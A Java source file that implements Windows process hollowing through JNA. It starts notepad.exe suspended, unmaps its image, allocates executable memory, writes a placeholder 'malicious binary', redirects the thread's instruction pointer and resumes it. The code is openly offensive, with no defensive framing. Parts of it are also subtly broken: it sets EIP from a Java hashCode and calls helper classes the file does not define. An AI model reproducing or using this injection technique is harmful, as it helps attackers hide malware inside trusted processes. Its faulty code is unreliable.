import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.platform.win32.WinBase.PROCESS_INFORMATION;
import com.sun.jna.platform.win32.WinBase.STARTUPINFO;
import com.sun.jna.platform.win32.WinDef.DWORD;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;

public class ProcessHollowing {

    // Defining the CONTEXT structure for modifying thread context
    public static class CONTEXT extends Structure {
        public int ContextFlags;
        public int Eax, Ebx, Ecx, Edx, Esi, Edi, Esp, Ebp, Eip;  // Registers for x86 systems

        @Override
        protected List<String> getFieldOrder() {
            return Arrays.asList("ContextFlags", "Eax", "Ebx", "Ecx", "Edx", "Esi", "Edi", "Esp", "Ebp", "Eip");
        }
    }

    public static void main(String[] args) {
        Kernel32 kernel32 = Kernel32.INSTANCE;
        Ntdll ntdll = Ntdll.INSTANCE;

        // Step 1: Create a new process in suspended state
        PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
        STARTUPINFO startupInfo = new STARTUPINFO();
        String appName = "C:\\Windows\\System32\\notepad.exe";

        boolean processCreated = kernel32.CreateProcessA(appName, null, null, null, false, 0x00000004,
                null, null, startupInfo, processInformation);

        if (!processCreated) {
            System.out.println("Process creation failed.");
            return;
        }

        if (processInformation.hProcess == null) {
            System.out.println("Invalid process handle.");
            return;
        }

        // Step 2: Unmap the legitimate process memory
        HANDLE processHandle = processInformation.hProcess;
        Pointer baseAddress = ProcessBaseAddress.getBaseAddressOfImage(processHandle);
        int unmapStatus = ntdll.ZwUnmapViewOfSection(processHandle, baseAddress);
        if (unmapStatus != 0) {
            System.out.println("Failed to unmap memory. Error code: " + unmapStatus);
            return;
        }
        System.out.println("Successfully unmapped legitimate process memory.");

        // Step 3: Allocate memory in the process
        Pointer remoteMemory = kernel32.VirtualAllocEx(processHandle, Pointer.NULL, 1024, 0x3000, 0x40);
        if (remoteMemory == null) {
            System.out.println("Memory allocation failed.");
            return;
        }

        // Step 4: Write malicious binary into memory
        byte[] maliciousCode = new byte[1024];  // Placeholder for malicious binary
        IntByReference bytesWritten = new IntByReference();
        boolean memoryWritten = kernel32.WriteProcessMemory(processHandle, remoteMemory, maliciousCode, maliciousCode.length, bytesWritten);

        if (!memoryWritten) {
            System.out.println("Failed to write malicious code to process memory.");
            return;
        }

        // Step 5: Set the thread context to point to the injected code
        HANDLE threadHandle = processInformation.hThread;  // Use thread handle from PROCESS_INFORMATION
        CONTEXT context = new CONTEXT();
        context.ContextFlags = 0x10001;  // CONTEXT_CONTROL

        boolean contextRetrieved = kernel32.GetThreadContext(threadHandle, context);
        if (!contextRetrieved) {
            System.out.println("Failed to retrieve thread context.");
            return;
        }

        context.Eip = remoteMemory.hashCode();  // Set EIP (or RIP for x64) to the address of malicious code

        boolean contextSet = kernel32.SetThreadContext(threadHandle, context);
        if (!contextSet) {
            System.out.println("Failed to set thread context.");
        } else {
            System.out.println("Thread context modified, ready to execute malicious code.");
        }

        // Step 6: Resume the thread to execute the injected code
        DWORD resumeResult = kernel32.ResumeThread(threadHandle);
        if (resumeResult.intValue() == -1) {
            System.out.println("Failed to resume the thread.");
        } else {
            System.out.println("Thread resumed, executing malicious code.");
        }
    }
}
